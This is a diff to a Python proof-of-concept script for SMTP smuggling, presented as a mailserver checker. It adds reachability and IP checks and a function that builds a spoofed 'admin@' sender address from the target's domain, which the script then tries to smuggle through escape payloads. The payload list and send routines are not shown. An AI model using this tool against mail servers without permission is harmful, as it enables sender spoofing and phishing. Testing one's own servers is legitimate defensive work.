@@ -1,22 +1,22 @@
-#!/bin/python3
+#! /bin/python3
 
 #
-#
+# ---------------------------------------------------------------------------------------------------------------
 #    _____  __  ___ ______ ____     _____                                  __               ____   ____   ______
 #   / ___/ /  |/  //_  __// __ \   / ___/ ____ ___   __  __ ____ _ ____ _ / /___   _____   / __ \ / __ \ / ____/
 #   \__ \ / /|_/ /  / /  / /_/ /   \__ \ / __ `__ \ / / / // __ `// __ `// // _ \ / ___/  / /_/ // / / // /     
 #  ___/ // /  / /  / /  / ____/   ___/ // / / / / // /_/ // /_/ // /_/ // //  __// /     / ____// /_/ // /___   
 # /____//_/  /_/  /_/  /_/       /____//_/ /_/ /_/ \__,_/ \__, / \__, //_/ \___//_/     /_/     \____/ \____/   
 #                                                        /____/ /____/                                          
-
+#
 # SMTP Smuggler PoC Script v0.1 for checking mailservers - 2024 - by suuhmer
 #
-# --------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------------------------------
 #
 # SMTP_SMUGGLER_POC Checker v0.1 
-# All rights reserved - (c) 2024 - suuhm
+# All rights reserved - (c) 2024 - suuhmer
 #
-# --------------------------------------------------------------------
+# ---------------------------------------------------------------------------------------------------------------
 #
 
 import socket
@@ -27,13 +27,12 @@ import getpass
 import time
 import smtplib
 
-
 #
 # GLOBAL VARS AND SETTINGS:
 # --------------------------
 email_subject = 'Subject: Your Subject'
 email_body_one = 'Here is the text of your email'
-admin_from = 'admin@mailserver.com'
+admin_from = 'admin@mymailserver.com'
 end_of_data_command = '\r\n.\r\n'
 
 
@@ -78,8 +77,58 @@ def resolve_domainname(server):
         server = info[0][4][0]
         print(f'Try to resolve {domain_name} to ip: {server}')
     except socket.gaierror as e:
+        import sys
         print(f'Error by domain resolve: {domain_name}: {e}')
+        sys.exit(0)
 
+
+def is_reachable(host):
+    try:
+        socket.create_connection((host, 80), timeout=5)
+        #return True
+    except (socket.timeout, socket.error):
+        import sys
+        #return False
+        print(f'Error by domain resolve: {host} !')
+        sys.exit(0)
+
+
+def is_ip(ip):
+    try:
+        socket.inet_pton(socket.AF_INET, ip)
+        return True  # ipv4
+    except socket.error:
+        try:
+            socket.inet_pton(socket.AF_INET6, ip)
+            return True  # ipv6
+        except socket.error:
+            return False
+
+
+def serv_to_email(server):
+    try:
+        if is_ip(server):
+            #
+            # ip_address = socket.gethostbyname(server)
+            #
+            # Try reverse dns lookup:
+            try:
+                domain_name, _, _ = socket.gethostbyaddr(server)
+                return serv_to_email(domain_name)
+                #return f"admin@{domain_name}"
+            except socket.herror:
+                print(f"Cannot get hostname, using dummy from-mail: {admin_from} ...")
+                return None
+        else:
+            raise socket.gaierror()
+    
+    except socket.gaierror:
+        # Get only domain if subdomain:
+        parts = server.split('.')
+        if len(parts) >= 2:
+            return f"admin@{parts[-2]}.{parts[-1]}"
+        else:
+            return f"admin@{server}"
 
 
 #
@@ -337,7 +386,7 @@ def main():
 
     susername = 'info@severname.com'
     spassword = 'CHANGE_ME'
-    srcpt = 'test@test.com'
+    srcpt = 'dummy@servername.com'
 
     parser = argparse.ArgumentParser(description='Send mail with TLS und AUTH PLAIN.')
     parser.add_argument('--server', type=str, default=sserver, help='SMTP-Servername DNS or IP')
@@ -357,10 +406,16 @@ def main():
     rcpt = args.rcpt
     global smtp_test_nr
 
+    global admin_from
+    admin_from = serv_to_email(server)
+
+    # Chcking for reachable and domain resolving stuff:
+    #
     #resolve_domainname(server)
+    is_reachable(server)
 
     for es in smtp_smuggle_escapes:
-        print(f'\n  -----\n[*] Trying with smuggle escape payload: ({repr(es)})\n  -----\n')
+        print(f'\n -------\n[*] Trying to smuggle {admin_from} /w escape payload: ({repr(es)})\n -------\n')
         time.sleep(1.4)
 
         if args.mode == 'def':
@@ -371,6 +426,7 @@ def main():
         
             except Exception as e:
                 print(f"Error sending: {e}")
+
         elif args.mode == 'raw':
             try:
                 send_socket_raw_mail(server, port, username, password, rcpt, es)
@@ -384,4 +440,3 @@ def main():
 
 if __name__ == "__main__":
     main()
-    
